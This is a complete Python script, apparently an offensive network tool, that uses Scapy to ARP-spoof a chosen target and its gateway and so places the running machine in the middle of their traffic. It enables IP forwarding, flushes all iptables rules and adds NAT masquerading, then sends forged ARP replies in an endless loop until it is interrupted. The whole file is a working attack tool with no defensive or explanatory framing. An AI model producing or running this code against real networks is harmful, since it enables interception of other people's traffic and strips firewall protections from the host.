#!/usr/bin/env python3
import scapy.all as scapy
import time
import argparse
import sys
import os
import signal
from threading import Event

# Disable Scapy warnings
scapy.conf.verb = 0


# Terminal colors
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'


# Network configuration
def setup_network():
    try:
        print(f"{Colors.BLUE}[*]{Colors.END} Configuring network settings...")
        os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        os.system("iptables --flush 2>/dev/null")
        os.system("iptables -t nat --flush 2>/dev/null")
        os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
        os.system("iptables -t nat -A POSTROUTING -j MASQUERADE 2>/dev/null")
    except Exception as e:
        print(f"{Colors.RED}[!]{Colors.END} Network configuration error: {e}")
        sys.exit(1)


# Get MAC address
def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        answered = scapy.srp(packet, timeout=2, verbose=False)[0]
        return answered[0][1].hwsrc
    except Exception:
        print(f"{Colors.RED}[!]{Colors.END} Could not get MAC address for {ip}")
        sys.exit(1)


# ARP spoofing function
def spoof(target_ip, spoof_ip, target_mac=None):
    try:
        if not target_mac:
            target_mac = get_mac(target_ip)

        # Create proper Ethernet frame to avoid warnings
        ether = scapy.Ether(dst=target_mac)
        arp = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        packet = ether / arp

        scapy.sendp(packet, verbose=False)
    except Exception:
        pass  # Silent fail for continuous operation


# Cleanup function
def restore(destination_ip, source_ip):
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)

        # Proper Ethernet frame for restoration
        ether = scapy.Ether(dst=destination_mac)
        arp = scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        packet = ether / arp

        scapy.sendp(packet, count=3, inter=0.1, verbose=False)
    except Exception:
        pass


# Exit handler
def exit_handler():
    print(f"\n{Colors.BLUE}[*]{Colors.END} CTRL+C detected. Cleaning up...")
    restore(args.target_ip, args.gateway_ip)
    restore(args.gateway_ip, args.target_ip)
    print(f"{Colors.GREEN}[+]{Colors.END} ARP tables restored. Exiting cleanly.")
    sys.exit(0)


# Signal handler
def signal_handler(sig, frame):
    exit_handler()


# Argument parser
def get_arguments():
    parser = argparse.ArgumentParser(description="Professional ARP Spoofing Tool")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="Gateway IP address")
    return parser.parse_args()


# Main function
def main():
    global args
    signal.signal(signal.SIGINT, signal_handler)

    args = get_arguments()
    setup_network()

    target_mac = get_mac(args.target_ip)
    gateway_mac = get_mac(args.gateway_ip)

    print(f"\n{Colors.HEADER}ARP Spoofing Initialized{Colors.END}")
    print(f"{Colors.BOLD}Target:{Colors.END} {args.target_ip} ({target_mac})")
    print(f"{Colors.BOLD}Gateway:{Colors.END} {args.gateway_ip} ({gateway_mac})")
    print(f"{Colors.BLUE}[*]{Colors.END} Spoofing started. Press CTRL+C to stop\n")

    sent_packets = 0
    try:
        while True:
            spoof(args.target_ip, args.gateway_ip, target_mac)
            spoof(args.gateway_ip, args.target_ip, gateway_mac)
            sent_packets += 2
            print(f"\r{Colors.GREEN}[+]{Colors.END} Packets sent: {sent_packets}", end="", flush=True)
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{Colors.RED}[!]{Colors.END} Critical error: {e}")
    finally:
        exit_handler()


if __name__ == "__main__":
    main()
